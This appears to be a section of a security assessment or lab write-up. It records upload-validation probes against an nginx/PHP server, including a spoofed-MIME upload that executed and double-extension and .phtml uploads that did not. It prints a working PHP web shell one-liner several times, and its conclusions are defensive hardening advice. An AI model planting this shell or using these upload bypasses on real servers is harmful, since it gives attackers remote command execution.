@@ -1,0 +1,24 @@
+###### Part B3: validation probes ######
+
+PROBE 1 — shell.php uploaded with Content-Type: image/png  => ACCEPTED and EXECUTED (shown in B1).
+  Proves: the declared MIME type is never compared to the bytes; extension alone decided execution.
+
+PROBE 2 — shell.php.png (double extension), requested:
+HTTP/1.1 200 OK
+Content-Type: image/png
+<?php system($_GET["cmd"] ?? "id"); ?>
+  (body is the literal PHP source, NOT uid= ) -> served as bytes, did NOT execute.
+  Proves: nginx handler keys on the FINAL extension (\.php$). A naive app check splitting on the FIRST dot would be fooled -> reject >1 dot.
+
+PROBE 3 — shell.phtml, requested:
+HTTP/1.1 200 OK
+Content-Type: application/octet-stream
+<?php system($_GET["cmd"] ?? "id"); ?>
+  (literal source, did NOT execute here) -> handler regex is \.php$ only.
+  Proves: .phtml/.php5/.php7/.phar are inert HERE but execute under handlers like \.php[0-9]?$ -> ALLOWLIST accepted types, never blocklist dangerous ones.
+
+>>> raw bodies for reference:
+-- shell.php.png body:
+<?php system($_GET["cmd"] ?? "id"); ?>
+-- shell.phtml body:
+<?php system($_GET["cmd"] ?? "id"); ?>
